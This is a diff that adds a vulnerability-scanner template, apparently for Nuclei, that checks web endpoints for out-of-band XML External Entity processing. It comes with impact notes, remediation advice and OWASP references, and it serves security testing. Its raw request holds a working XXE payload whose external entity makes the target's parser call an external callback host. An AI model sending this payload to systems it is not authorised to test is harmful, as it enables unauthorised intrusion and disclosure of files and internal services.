@@ -1,0 +1,52 @@
+id: xxe-generic-oob
+
+info:
+  name: Generic XXE - Out-of-Band Entity Expansion
+  author: n0x
+  severity: high
+  description: |
+    Sends an XML document with an external general entity pointing at an
+    Interactsh callback. A DNS or HTTP interaction confirms that the XML parser
+    resolved the external entity. This is parser-agnostic and works against
+    Python, Java, .NET, PHP, and other XML stacks when external entities are
+    enabled.
+
+    The endpoint must accept XML. Override xxe_url with -var when the XML
+    parser is not at the site root.
+  impact: |
+    XXE can lead to local file disclosure, SSRF, internal service access, and
+    in some stacks remote code execution.
+  remediation: |
+    Disable external entity and DTD processing in the XML parser, use secure
+    parser defaults, and restrict outbound network access from application
+    servers.
+  reference:
+    - https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+    - https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+  classification:
+    cwe-id: CWE-611
+  metadata:
+    max-request: 1
+  tags: xxe,oob,web
+
+variables:
+  xxe_url: "{{BaseURL}}"
+
+http:
+  - raw:
+      - |
+        POST {{xxe_url}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+        Accept: application/xml
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{{interactsh-url}}/xxe-generic">]>
+        <foo>&xxe;</foo>
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
